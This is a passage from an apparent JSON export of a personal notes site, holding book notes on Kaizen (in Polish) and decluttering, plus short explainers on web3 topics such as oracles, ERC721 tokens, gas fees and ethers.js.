Habits](https://www.audible.com/pd/Atomic-Habits-Audiobook/1524779261) - James Clear\n- 🎧 [The Total Money Makeover](https://www.audible.com/pd/The-Total-Money-Makeover-Audiobook/B002UUKIR8) - Dave Ramsay\n- 📱 [The Subtle Art Of Not Giving A Fuck](https://www.amazon.com/Subtle-Art-Not-Giving-Counterintuitive/dp/0062457713) - Mark Manson\n- 📱 [The Bullet Journal Method](https://www.amazon.com/Bullet-Journal-Method-Present-Design/dp/0525533338/) - Ryder Carroll\n- 📱 [Manhood: How to Be a Better Man-or Just Live with One](https://www.amazon.com/Manhood-Better-Man-Just-Live-ebook/dp/B00H6JHR5E) - Terry Crews - ⭐️⭐️⭐️⭐️\n- 📕 [Create or Hate](https://www.amazon.com/Create-Hate-Successful-People-Things/dp/0995404445/) 🇵🇱 - Dan Norris - ⭐️⭐️\n\n## Earlier\n\n- 📱 [Remote. Office Not Required](https://www.amazon.com/Remote-Office-Required-Jason-Fried/dp/0091954673) - Jason Fried\n- 📱 [Rework](https://www.amazon.com/ReWork-Change-Way-Work-Forever-ebook/dp/B003ELY7PG/) - Jason Fried\n\n📱 - eBook | 🎧 - audiobook | 📕 - paperback | 🇵🇱 - read in Polish\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/reading/notes/kaizen":{"title":"Filozofia Kaizen. Małymi krokami ku doskonałości 🇵🇱","content":"\nBy Robert Maurer. 3/5.\n\n\u003e An introduction to the method of small steps. Too long for such a tiny topic. Wasn't as informative as I thought.\n\n## Innowacja\n\nSłowa _innowacja_ używa się powszechnie jako _dokonanie przełomu_. W biznesie - _drastyczna zmiana_ (która w idealnych warunkach trwa krótko, wywołując ogromne zmiany jednocześnie; szokująca, radykalna zmiana), np.\n\n- masowe zwolnienie (trwa krótko), nagła konieczność restrukturyzacji\n- zainwestowanie hajsu w startup (trwa krótko), ogromny zysk\n  (ale też poza biznesem)\n- rzucanie nałogu _cold-turkey_\n- radykalny plan na pozbycie się długu\n\nRadykalne zmiany mogą spowodować słomiany zapał.\n\n## _kaizen_\n\nW biznesie: Przeciwieństwo [[books/book/kaizen#Innowacja|innowacji]]. Dosłownie: metoda ustawicznego poprawiania procesu procesu zarządzania i produkcji na każdym jego szczeblu, just-in-time.\n\n- Każdy pracownik może zgłosić pomysł na poprawienie procesu\n- Bez oceniania\n  W życiu: W miarę wygodne, drobne kroki w stronę rozwoju. _Metoda małych kroków_\n\n\u003e \"Nawet najdłuższa podróż zaczyna się od jednego kroku\".  \n\u003e —Lao Cy\n\n## Dlaczego Kaizen?\n\nZmiany z dnia na dzień są drobne i wykonalne niemal bez wysiłku (sprzyjające środowisko). W długim czasie doprowadzają do ogromnej zmiany.\n\nMałe kroki kaizen:\n\n- wyłączają/oszukują mechanizm lęku (walka/ucieczka) przed ogromnymi zmianami\n  - mechanizm lęku: śródmózgowie-\u003eciało migdałowate; reakcja walki lub ucieczki, uruchamiany gdy chcemy nagle wdrożyć zmianę ([[books/book/kaizen#Innowacja|innowację]]).\n    - Nagła zmiana zawsze wywołuje strach\n    - Reakcja mózgu jest automatyczna\n      - bardziej świadoma część mózgu (kora mózgowa) może zostać _zablokowana_\n- stymulują racjonalne podejście i twórcze myślenie\n- tworzą nowe połączenia nerwowe budując jednocześnie nowe nawyki\n- zaspokajają potrzebę by _iść do przodu_ i osłabiają stres\n- wysiłek jest niemal niezauważalny\n  - zwłaszcza gdy wykonanie zadania jest przyjemne i powoduje dumę\n\n## Oczekuj strachu\n\nStrach ostrzega przed wyzwaniem, oznacza ambicję, wzmacnia nadzieję. Im więcej odczuwamy strachu, tym bardziej się o coś troszczymy.\n\nOczekując strachu możesz podejść do problemu na spokojnie.\n\n## Małe pytania\n\nMózg uwielbia pytania. Pytania typu \"jak mam schudnąć 25kg w 2 tygodnie\" są trudne i budzą ogromny lęk. Pytając **\"jakie najmniejsze kroki mogę podjąć by poprawić swoje zdrowie?\"** tego lęku nie budzą:\n\n- co mogę robić 5 minut dziennie aby poprawić swój budżet/zdrowie/relacje?\n\nPo czasie mózg zacznie odpowiadać skutecznymi pomysłami - ciało migdałowate spoczywa, a kora mózgowa może się wykazać.\n\nWymagają spokoju i cierpliwości. Należy zadawać sobie pytania regularnie, tak długo jak jest to konieczne aby mózg odpowiedział.\n\n- tracimy kontrolę nad samym procesem zmiany i nie możemy określić momentu w którym osiągneliśmy cel, tak jak nie możemy powiedzieć **kiedy** opanowaliśmy jazdę samochodem czy grę na gitarze\n\nNależy pytać o pozytywy (zamiast _dlaczego jestem taki gruby?_ zapytać *co małego mi się dziś w sobie podoba?*).\n\nMałe pytania mogą [[quotes/robert-maurer-on-humour|wydawać się śmieszne]], ale przynajmniej nie wzbudzają negatywnej reakcji, lęku.\n\nZnakiem, że można iść dalej, jest wykonywanie poprzedniego kroku automatycznie, bez wysiłku i nawet z przyjemnością.\n\n### Przykłady\n\n- Perry Spencer - mikrofalówka\n  - zostawił batonika obok radaru\n  - zapytał \"Dlaczego radar stopił batonika\"\n  - zadawał kolejne małe pytania\n  - mikrofalówka\n- kogo mogę poprosić o pomoc?\n- w jaki jak najmniejszy sposób mogę poprawić swoją dietę?\n- co mogę zrobić aby choć odrobinę poprawić swoje relacje z klientem?\n- jaką jedną rzeczą mój mąż mnie uszczęśliwia?\n- co mogę zrobić aby w małym stopniu przybliżyć się do swojego celu?\n- z kim dawno nie rozmawiałem?\n- co mogę dobrego powiedzieć o _tej_ osobie?\n\nOdpowiedzi warto zapisywać w [[books/book/kaizen/dziennik|dzienniku]] (lub w innej formie).\n\n## Rzeźbienie umysłu\n\nPolega na _udawaniu czynności_ w wyobraźni. Przydatne w realizowaniu trudnych przedsięwzięć.\n\nMózg nie rozumie różnicy pomiędzy rzeczywistością, a światem wyobraźni. Wykonując _trening_ (wyobrażając sobie ćwiczenie), nadal wpływam na chemię organizmu. Nadal tworzą się połączenia neuronowe.\n\n1. Wybierz zadanie (budzące lęk lub dyskomfort)\n2. Zdecyduj przez ile czasu dziennie chcesz _rzeźbić_ umysł (w sekundach).\n   - czas musi być dobrany tak, aby nie było kłopotliwym wykonać zadanie **codziennie**\n3. Wykonuj ćwiczenie w cichym i wygodnym miejscu.\n4. Wyobraź sobie trudną sytuację, wyzwanie.\n   - \\_Co widzisz? Co Cię otacza? Kto się tam znajduje? Jak wygląda?\\_\\_ Postaraj się zobaczyć wyraz twarzy innych ludzi, ich ubrania, posturę.\n   - Wyobrażaj sobie także zapachy, smaki, dźwięki\n5. Wyobraź sobie wykonywanie zadania\n   - użyte słowa, ton głosu, uczucie trzymania przedmiotu itp.\n6. Wyobraź sobie pozytywny _outcome_ w reakcji na wykonanie zadania\n   - wystąpienie publiczne -\u003e wpatrzone z ciekawością oczy publiczności, szmer notowania itd.\n7. Wykonaj zadanie kiedy już poczujesz się na siłach po mentalnym treningu\n\n## Postanowienia noworoczne - przykłady\n\n- Zdrowe odżywianie\n  - _wyrzucaj_ pierwszy kęs tuczącej przekąski przez miesiąc\n  - _wyrzucaj_ dwa pierwsze w kolejnym miesiącu\n  - w trzecim - trzy kęsy\n  - skoncentruj się na tym by jeść wolniej i być bardziej skupionym na jedzeniu\n- Ćwiczenia\n  - używaj zaciskacza podczas oglądania TV\n  - wykonuj przez jakiś czas jedną pompkę dziennie\n  - przejdź jedno piętro piechotą zamiast użyć windy\n  - zadaj sobie pytanie _jaka mała aktywność sprawi mi przyjemność_ (bieganie, rower czy basen)\n- Oszczędzanie\n  - odkładaj 5zł dziennie\n    - np. zastępując kawę mniejszą\n  - raz dziennie wymyśl sposób na wydanie zaoszczędzonych pieniędzy\n    - znajdziesz większą motywację by oszczędzać zamiast korzystać z małych przyjemności\n- Produktywność\n  - spisz rzeczy, które pożerają czas\n  - spisz rzeczy, które wg ciebie są bardziej produktywne. Każdego dnia dodawaj jedną rzecz do listy\n  - kiedy poczujesz, że chcesz wypróbuj jedną z nich w stylu [[books/book/kaizen#_kaizen_|kaizen]]\n\n## Rozwiązywanie problemów\n\nRozwiązuj problemy jak tylko się pojawią\n\n- [[quotes/the-minimalists-on-procrastination|bez prokrastynacji]]\n- jesteśmy przyzwyczajeni do małych problemów dlatego nie rozwiązujemy _drobnych niedogodności_\n  - zgodnie z [[books/book/kaizen/teoria rozbitych okien|teorią rozbitych okien]]\n- a przecież są mogą one być *znakami ostrzegawczymi*\n  - zastanów się czy przy ostatnim, _dużym_ problemie pojawiły się wcześniej jakieś małe znaki ostrzegawcze\n  - zastanów się co pomogło rozwiązać ten problem\n\nZadawaj sobie [[books/book/kaizen#Małe pytania]] aby nauczyć się rozwiązywać problemy zawczasu\n\n- _jaki krok mogę podjąć, żeby poprawić sytuację?_\n- _czy małe problemy wykazują tendencję do rozwoju?_\n- _czy mogę osadzić problem w szerszym kontekście?_\n\nNigdy nie zakładaj, że _systemy_ będą działać niezawodnie (jeżeli coś może pójść źle, to tak się stanie; _prawo Murphy'ego_).\n\nNie reaguj gniewiem. Odpowiadając gniewem na życiowe wyzwania masz siedmiokrotnie wyższą szansę zapadnięcia na choroby serca niż ludzie prowadzący identyczny styl życia, lecz o innym temperamencie.\n\nKorzystaj ze swojej wewnętrznej mądrości. Zareaguj na drobne, przejmujące uczucie, że _coś jest nie tak_.\n\n## Nagrody\n\nNagradzaj się za kolejne kroki.\n\nKorzystaj z **małych nagród**.\n\nMałe nagrody są optymalne ponieważ wykorzystują jedną z zasad ludzkiej natury: im większa nagroda zewnętrzna, tym większa jest też szansa, że osłabi lub stłumi wrodzone dążenie do doskonałości.\n\n- większe nagryody redukują wewnętrzną motywację na rzecz zewnętrznej.\n- w środowisku korporacyjnym duże nagrody pieniężne mogą sugerować, że pracownik jest trybikiem w maszynie i musi być zachęcany do działania wyłącznie obietnicami osobistego zysku\n- małe nagrody są formą uznania i docenienia potrzeby rozwoju i wkładu osobistego\n\n### Przykłady\n\n- podziękowanie\n- uczciwa uwaga na swój temat (np. gdy problemem jest walka z krytycyzmem)\n- małe i drobne _prezenty_\n\n## Małe momenty\n\n_Kaizen_ wymaga wolniejszego tempa. Dostrzeganie małych momentów (zachwytów nad codziennością) uczy życia _tu i teraz_.\n\nWiele przełomowych dokonań wynikło bezpośrednio z cierpliwej, codziennej obserwacji małych zjawisk.\n\n### w związkach\n\nW szczęśliwych małżeństwach przejawy pozytywnego stosunku do partnera występują pięć razy częściej niż przejawy negatywne. Docenia się takie małe gesty jak:\n\n- mówienie spokojnym głosem po otrzymaniu telefonu od partnera\n  - przeciwstawne podenerwowaniu czy szybkiej rozmowie sugerującej, że telefon przerwał wykonywanie ważnych zadań\n- pytanie o szczegóły z dnia drugiej osoby\n- odkładanie telefonu, gdy partner wchodził do pokoju\n- wracanie do domu o umówionej godzinie\n  - albo przynajmniej zawiadamianie o planowanym spóźnieniu.\n- koncentrowanie się na zaletach partnera, zamiast na wadach\n\nMałe momenty pozwalają drugiej osobie odczuć troskę i opiekę. Pozwala odczuć bycie kochanym za to jakim się jest, a nie za to co się robi.\n\n## Podsumowanie\n\nPiękno kaizen i jego wyzwanie polega jednak na tym, że wymaga ono wiary w siłę ciała i umysłu. Podejmując małe kroki, ustawiasz swój wewnętrzny kompas na nowy azymut i pozwalasz, by umysł zajął się resztą.\n\nZamiast agresywnie zmuszać się do \"wojskowego\" myślenia o zmianie, pozwól, by umysł dokonywał skoków we własnym tempie.\n\nPatrz na kaizen jako na proces, który nigdy się nie kończy, postrzegania życia w kategoriach okazji do ustawicznego rozwoju, ciągłego podnoszenia poprzeczki oraz rozwijania własnego potencjału.\n\nBo co może być ważniejszego w życiu niż wyciąganie możliwości z każdej mijającej chwili?\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/reading/notes/lifechanging-magic-of-tidying-up":{"title":"The Life-changing Magic of Tidying Up","content":"\nBy Marie Kondo. **5/5**. [Amazon](https://www.amazon.com/Life-Changing-Magic-Tidying-Decluttering-Organizing/dp/1607747308).\n\n\u003e Lessons from this one (and from [this Netflix's piece](https://www.netflix.com/pl-en/title/80209379)) helped us to _throw out_ ~15 bags of clutter right before our kiddo was born. I had to mentally skip the metaphysical BS though. Remarkable piece.\n\n## How to declutter?\n\n\u003e [!tip] Tip\n\u003e\n\u003e According to the author it should be enough to do it once in a lifetime, but my experience is that it's good to do it every now and then (like during the moving out, after a kid is born etc.).\n\nDeclutter the whole house at once. Occasional tidying up won't change your relationship with possessions and the clutter will find its way back into your life.\n\nGo through your possessions by category - items belonging to one category may lie in different locations. Put them in one place (e.g. on bed) to see how much of them you have.\n\nGrab every item and decide if you want to keep it. Focus on **its purpose**, **why you have it** and **if it brings you _joy_**. If it doesn't serve any purpose and you don't need it anymore, remove it from your life immediately.\n\nDon't listen to music or watch Netflix _in the meantime_ etc. **Focus on cleaning up** not only the space but also the _mental space_ the items take in your life.\n\nDo it in this order:\n\n- clothes (you may split them into subcategories like jackets, t-shirts if you want)\n- books\n- paperology\n- _komono_ (others)\n- things of emotional value and memorabilia\n\nKeeping this order also makes decluttering easier, allows to gain the momentum and teaches how to make the decisions for later.\n\n### Clothes\n\nLeave only the clothes you wear. Don't keep the items to _use them at home when no-one looks_. You look.\n\nFold the foldables whenever possible (eg. trousers), hang the clothes that look better hanged (eg. shirts).\n\n\u003ciframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/IjkmqbJTLBM\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen\u003e\u003c/iframe\u003e\n\nKeep the clothes of the same category in the same place. Also, try to keep them from _heavier_ to _lighter_ (in terms of the material and color).\n\nWhenever it's possible, don't divide clothes by seasons - the simpler categorisation, the better. You ain't taxonomist.\n\nMake all the clothes accessible to you at any given moment. Don't keep them in the backs of your closet, it will wrinkle them. And you won't enjoy them oftenly.\n\nKeep the lighter colors in front of the drawer.\n\n### Books\n\nDon't open them during decluttering. If you think you will read a particular book at some point, you probably won't. The same applies to already read books. Keep only your personal bests.\n\n### Paperology\n\nYou don't need the papers that are not actionable right now, or you don't have to keep them for external reasons (e.g. tax stuff). Keep the papers in one place, a cabinet, drawer or a binder.\n\nIf there is something you'd like to keep, but it doesn't have to be in physical form for legal reasons, scan it and keep it in the cloud.\n\n### _Komonos_\n\nDon't keep items _just because_. If they don't bring you joy or don't serve any purpose, just let them go away.\n\n#### Gifts\n\nIf you don't like something you got, throw it away. The reason for someone to get you something is for you to accept it. It's a way of sharing love. Sometimes you won't enjoy the gift and that's ok.\n\n#### Electronics and cables\n\nKeep as many cables as you need and nothing more. You don't need cables for that old 2MP camera from 2001.\n\nDon't keep the broken electronics at home. Probably you won't be able to fix them on your own, and if you didn't already, you won't ask anyone to do that for you either.\n\n#### Boxes\n\nFor most of your belongings you don't need to keep the boxes that they come in. Only in rare occasions lack of the box would affect the price if you'd want to sell the item.\n\n#### Others\n\nCoins should be in the wallet or the savings jar. The shopping bags (well, every kind of bags) can sit in one of them. Necessary kitchen appliances should be hidden in the drawers. Etc, etc.\n\n### Memorabilia\n\nJust keep in mind who you are right now, not who you were back then, or who was part of your life in the past. This will tell you what you want to remove.\n\n## How to store things?\n\nOnce you're done with eliminating, think of where to put the things that you want in your life.\n\nFind a home for every item you have. By the _home of an item_ the author means the its place. If this rule is violated, the house will be cluttered in no time.\n\nThe simpler the storage system, the better. Having a sophisticated solution needs maintenance. Also, the more you need to think of where to put an item, the higher chance of putting it anywhere.\n\nExperts in organizing things are hoarders.\n\nKeep the same items close. Ideally vertically, not stacked. Items at the bottom of the stack are more difficult to get, they disappear from your sight.\n\n## How to buy stuff\n\nAsk yourself if buying the particular item will bring you the joy. If you can - buy the used items but in a decent condition.\n\nThrow away boxes, remove label tags. Treat your new things **as yours**.\n\n## Day to day decluttering\n\nSpend few minutes every day to put the items where they belong. Simple as that. You won't have to think about clutter anymore.\n\n## Resources\n\n- [Talk about this book @ ThePodcast.fm](http://thepodcast.fm/episodes/146)\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/":{"title":"web3","content":"\n## Whitepapers\n\n- [Bitcoin Whitepaper](https://bitcoin.org/bitcoin.pdf)\n  - [In Polish](https://bitcoin.org/files/bitcoin-paper/bitcoin_pl.pdf) 🇵🇱\n- Ethereum Whitepaper\n  - [In Polish](https://ethereum.org/pl/whitepaper/) 🇵🇱\n\n## Articles\n\n- [Get started Building Web3 Apps with Cloudflare](https://blog.cloudflare.com/get-started-web3/)\n  - https://cf-web3.pages.dev/\n  - https://github.com/cloudflare/cfweb3\n\n## Tutorials\n\n- [Buildspace](https://buildspace.so/p)\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/ABI":{"title":"ABI","content":"\nBy definition, an `ABI` (or _Application Binary Interface_) is the interface of interoperability of compiled software (hence _binary_).\n\nIn [[EVM]] [[web3/smart-contracts]] need to be compiled from e.g. [[web3/solidity/_index]] to EVMs bytecode. The smart contract is just this sequence of bytecode. To access functions defined in high-level languages, users need to translate names and arguments into byte representations for byte code to work with it. The ABI documents these names and types precisely, easily parseable format, doing translations between human-intended method calls and smart-contract operations discoverable and reliable.\n\nIn other words, when you compile your smart contract, the compiler spits out a bunch of files needed that lets you interact with the contract. The files are basically the ABI.\n\nIn [[web3/solidity/Hardhat]] compiled ABI lies under `artifacts/contracts/\u003ccontractName\u003e.sol/\u003ccontractName\u003e.json`.\n\n## Resources\n\n- https://www.quicknode.com/guides/smart-contract-development/what-is-an-abi\n- https://docs.soliditylang.org/en/v0.8.14/abi-spec.html\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/Chainlink":{"title":"Chainlink","content":"\n[Chainlink](https://chain.link) is the most widely-known [[web3/don|Decentralized Oracle Network]].\n\nTo be precise, Chainlink is a framework for DONs, and is a way to get data in from multiple sources across multiple oracles. In this context, Chainlink is not a _data provider_. It's simply a decentralized network of centralized [[web3/oracle]] node operators.\n\nThe Chainlink network uses a system called [Off-Chain Reporting](https://docs.chain.link/docs/off-chain-reporting/) to reach a consensus on data off-chain, and report the data in a cryptographically proven single transaction back on-chain for users to digest.\n\nChainlink is entirely [[blockchain]] agnostic.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/QuickNode":{"title":"QuickNode","content":"\n[QuickNode](quicknode.com/) is an online service that enables you to deploy [[web3/smart-contracts]] to the real [[web3/blockchain|blockchains]].\n\nQuickNode essentially helps us broadcast our contract creation transaction so that it can be picked up by miners as quickly as possible.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/api-connectivity-problem":{"title":"The API Connectivity problem","content":"\nDue to the deterministic nature of the [[web3/blockchain]] we can't use APIs in the [[web3/smart-contracts]] directly.\n\nIf we'd want to send a variable amount based on the price of ETH to Alice from Bob’s account, we'd have our contract call an API to get the price of ETH and then send that amount to Bob. When every other node goes to verify this, they also have to call this API.\n\nHowever, the API and/or its response may change:\n\n- the API could be hacked, deprecated or broken\n- the response may change depending on the timing\n\nThe different blockchain nodes might get different API responses (or didn't get them at all). That means the blockchain wouldn't be able to verify transactions, as the different nodes would be in different states and wouldn't be able to agree on the actual one.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/blockchain":{"title":"blockchain","content":"\nA blockchain has its [[distributed ledger]] nature, each node in the network has to be able to find the same end result given the same input. That means if we were to replay every transaction, we would end up in the correct state.\n\nThe crucial aspect about the blockchain is that [[web3/smart-contracts]] can be deployed to that blockchain and that users of that blockchain can execute the code. Smart contracts executed against the blockchain are like the controller of the [[MVC model]].\n\nIn this context, the blockchain can be treated as a cloud provider that is owned by no one. It's run by compute power of people who want to support the [[Ethereum network]].\n\n\u003e [!tip]\n\u003e\n\u003e Blockchains are essentially very secure, distributed, and decentralized databases.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/crypto-wallet":{"title":"crypto wallet","content":"\n## Connecting a wallet\n\nA crypto wallet can be connected to a web application to give it the permissions to call the [[web3/smart-contracts]] on our behalf. It's a web3 way of authentication.\n\nThe _Connect wallet_ button is basically a _Login_ button for web3.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/don":{"title":"Decentralized Oracle Network","content":"\n**DON** (_Decentralized OracleNetwork_) is a group of independent [[web3/oracle|oracles]] that provide external data to the [[blockchain]].\n\nDecentralized oracle networks eliminate any [[web3/single-point-of-failure]] in the [[web3/smart-contracts]] by utilizing multiple data inputs. This enables end-to-end reliability and allows high-value smart contracts in low trust environments to become viable.\n\n## How does a DON work?\n\nEvery independent node in DON independently retrieves data from an [[off-chain]] source and brings it [[on-chain]]. The data is then aggregated into a deterministing value of truth for that data point. The value is put on the blockchain in a smart contract (often referred to as a _data feed_) for us to read from. The value is constantly updated by the DON itself.\n\nIf a singular node or source is hacked, depreciated, or deleted, the DON will leverage the decentralized network and carry on.\n\nThe most widely-known DON is [[web3/Chainlink]].\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/ethereum/":{"title":"Ethereum","content":"","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/ethereum/ERC721":{"title":"ERC721 standard","content":"\n*ERC721 tokens* are **not** interchangeable and **not** divisable.\n\nEach once is assumed to be **unique** (they have a unique ID). You can only trade them as a whole units.\n\nWe don't have to implement the auction/escrow logic because we're conforming the ERC721 token specification.\n\nThis means everybody can build an exchange platform for ERC721 collectibles and vice-versa.\n\nAn ERC721 contract interface looks like this:\n\n```solidity\ncontract ERC721 {\n  event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId);\n\n  event Approval(address indexed _owner, address indexed _approved, uint256 indexed _tokenId);\n\n  function balanceOf(address _owner) external view returns (uint256);\n  function ownerOf(uint256 _tokenId) external view returns (address);\n  function transferFrom(address _from, address _to, uint256 _tokenId) external payable;\n  function approve(address _approved, uint256 _tokenId) external payable;\n}\n```\n\nThe best way to implement a token contract is to keep the standard definition in a separate file `erc721.sol`.\n\n## Functions\n\n- [[web3/solidity/balanceOf]]\n- [[web3/solidity/ownerOf]]\n- [[web3/solidity/transferFrom]]\n- [[web3/solidity/approve]]\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/ethereum/burning-tokens":{"title":"Burning tokens","content":"\n[[web3/solidity/erc721-ownership-transfer|Transferring]] a token to an address of `0` is basically sending it to a wallet **no one** has the private key for, esentially making it unrecoverable. It's called _burning a token_.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/ethereum/eth_accounts":{"title":"eth_accounts","content":"\n`eth_accounts` is a special method that is used to see if you are authorized to access any of the accounts in the [[web3/crypto-wallet]].\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/ethereum/eth_requestAccounts":{"title":"eth_requestAccounts","content":"\n`eth_requestAccounts` function is used to ask the [[web3/crypto-wallet]] to give the dApp the access to the user's wallet.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/ethereum/gas-fee":{"title":"gas fee","content":"\nIn [[Ethereum network]] the _gas_ is a _fuel_ the [[dApps]] run on.\n\nEvery time the user executes a function on a [[Ethereum network]], he has to pay for it in ETH.\n\nHow much gas is required to execute a particular function depends on its complexity. Each individual operation (like writing to a storage, or adding two numbers) has a **_gas cost_** based roughly on how much computing resources will be required to perform that operation.\n\nThe overall _gas fee_ is a sum of all these gas costs.\n\n## Why is gas necessary?\n\n[[Ethereum network]] is like a big, slow, but extremely secure computer. When you execute a function, every single node on the network needs to run that same function to verify its output — thousands of nodes verifying every function execution is what makes Ethereum decentralized, and its data immutable and censorship-resistant.\n\nThe creators of Ethereum wanted to make sure someone couldn't clog up the network with an infinite loop, or hog all the network resources with really intensive computations. So they made it so transactions aren't free, and users have to pay for computation time as well as storage.\n\n## Gas fee estimation\n\nEvery time a user tries to call a function on a [[web3/smart-contracts]], the [[web3/crypto-wallet]] will try to estimate the gas fee. However, the estimation may not be precise, especially if some degree of [[randomness]] is involved.\n\nIt's possible to _limit_ how much of gas the user would want to pay for calling the function, e.g. in [[ethers]].\n\n## Optimisation\n\nBecause every function costs real money, code optimisation is extremely important. There are some pretty simple ways to optimise the code:\n\n- [[web3/solidity/struct-packing]]\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/ethereum/goerli":{"title":"Goerli Testnet","content":"\n[Görli Testnet](https://goerli.net/) is a testing [[Ethereum network]] run by Ethereum Foundation for testing the [[web3/smart-contracts]] being developed for free.\n\nGoerli uses fake GoerliETH (fake ETH) for [[web3/transaction]]s.\n\n## Faucets\n\nTo obtain GoerliETH it's necessary to _ask the network_ for some using _faucets_.\n\nMetaMask has to be set to Goerli Test Network first (testing networks are not visible by default).\n\nFaucets I've used before:\n\n- [Goerli Proof-of-Work faucet](https://goerli-faucet.pk910.de/) (**recommended**) - requires some mining work in exchange for GoerliETH.\n  - From my experience, it's the fastest way to obtain GoerliETH for development\n- [Chainlink](https://faucets.chain.link/) - forces you to login with Twitter account\n- [Goerli Faucet](https://goerlifaucet.com) - requires creating an [Alchemy](https://www.alchemy.com/) account and log in with it\n- [Faucet Link](https://faucetlink.to/goerli) - other faucets for Goerli and [[Sepolia]]\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/ethereum/methods":{"title":"Ethereum network methods","content":"\n- [[web3/ethereum/eth_accounts]]\n- [[web3/ethereum/eth_requestAccounts]]\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/ethereum/tokens":{"title":"tokens","content":"\nA *token* on [[Ethereum]] is basically just a [[web3/smart-contracts|smart contract]] that implements a standard set of functions that all other token contracts share, such as:\n\n- `transferFrom`\n- `balanceOf`\n\nInternally the smart contract usually has a [[web3/solidity/mapping]] that keeps track of how much balance each address has:\n\n```solidity\nmapping(address =\u003e uint256) balances\n```\n\nSo basically a token is just a contract that keeps track of who owns how much of that token, and some functions so those users can transfer their tokens to other addresses.\n\n\u003e [!danger] ERC20\n\u003e By default, by _token_ we mean specifically an **ERC20 token**, but there are other standards of tokens.\n\n## ERC20 token interoperability\n\nSince all ERC20 tokens **share the same set of functions**, they can all be interacted with in the same ways.\n\nIf you build an application that is capable of interacting with one ERC20 token, it's also capable of interacting with any ERC20 token without any additional work to do (except plugging in another ERC20 token contract address).\n\nIn practice - when an exchange adds a new ERC20 token, really it just needs to add another smart contract it talks to. For the exchange example it means the transfers logic needs to be implemented once.\n\n## Token standards\n\n**ERC20** tokens are a go-to solution for currency-like usage. But they're not particularly useful for representing the _objects_, for example:\n\n_Collectible_ isn't divisible like currency — transfering you 0.237 of a _collectible_ doesn't make sense. _Collectibles_ don't necesarrily have to be _equal_ (their internal state may differ, they may have different parameters and [[rarity]]).\n\nFor collectibles a go-to solution is to use [[web3/ethereum/ERC721]] standard.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/frontend/":{"title":"Front-end development for web3","content":"\nDeveloping a front-end in web3 doesn't differ much from the web2. The main difference is to use [[web3/crypto-wallet]] for authorization, authentication and interaction with the web application.\n\n## Libraries\n\n- [web3.js](https://web3js.readthedocs.io/en/v1.8.0/)\n- [[web3/frontend/ethers|ethers.js]]\n- [react-wagmi](https://wagmi.sh)\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/frontend/Providers":{"title":"Providers","content":"\nA _Provider_ in [[web3/frontend/ethers]] is used to actually _talk_ to [[Ethereum network]] nodes.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/frontend/Signers":{"title":"Signers","content":"\nIn [[ethers]] a _Signer_ is an abstraction of an [[Ethereum]] account, which can be used to sign transactions and send signed transactions to the [[Ethereum Network]] to execute state changing operations.\n\nThe available operations depend largely on the sub-class used.\n\nThe most common Signers are:\n\n- `Wallet`, which is a class which knows a [[web3/crypto-wallet]] private key and can execute any operations with it\n- [[JsonRpcSigner]], which is connected to a JsonRpcProvider (or sub-class) and is acquired using `getSigner()`\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/frontend/ethers":{"title":"ethers.js","content":"\n[`ethers.js`](https://docs.ethers.io/v5/) is a library for interacting with an [[Ethereum network]] and its ecosystem.\n\n- [[web3/frontend/Signers]]\n- [[Providers]]\n\n## `gasLimit`\n\nIn `ethers` it's possible to limit how much of gas the users may pay for calling the function.\n\n```ts\ncontract.functionToCall(message, { gasLimit: 300000 });\n```\n\nThis way makes the user pay a set amount of gas of 300,000. I he don't use all of it in the transaction he'll automatically be refunded (if a transaction costs 250,000 gas then after that transaction is finalized that 50,000 gas left over that the user didn't use will be refunded).\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/oracle":{"title":"Oracle","content":"\nAn _oracle_ is any entity or device that connects a deterministic [[web3/blockchain]] with [[off-chain]] data (and vice-versa).\n\nOracles are used to provide external data to the [[web3/smart-contracts]]. They serve as a middleware between the blockchain and the external APIs.\n\nThe oracles enter every data input through an external transaction.\n\nThe oracles solve [[web3/api-connectivity-problem]].\n\nHowever, they are prone to the [[web3/single-point-of-failure]] problem.\n\n\u003e [!tip] Keep in mind\n\u003e\n\u003e _Oracles_ and _data providers_ are not the same thing. Confusingly, sometimes that is the case: a company that provides a data stream will themselves act as the oracle delivering that data to a user directly.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/single-point-of-failure":{"title":"Single point of failure","content":"\nThe _single point of failure_ problem raises if the [[web3/smart-contracts]] use centralized [[web3/oracle]].\n\nA centralized oracle means that one entity has the power over your smart contract, and your smart contract is now no better than a regular contract.\n\nThe solution to this problem is to use [[web3/don|Decentralized Oracle Network]].\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/smart-contracts":{"title":"Smart 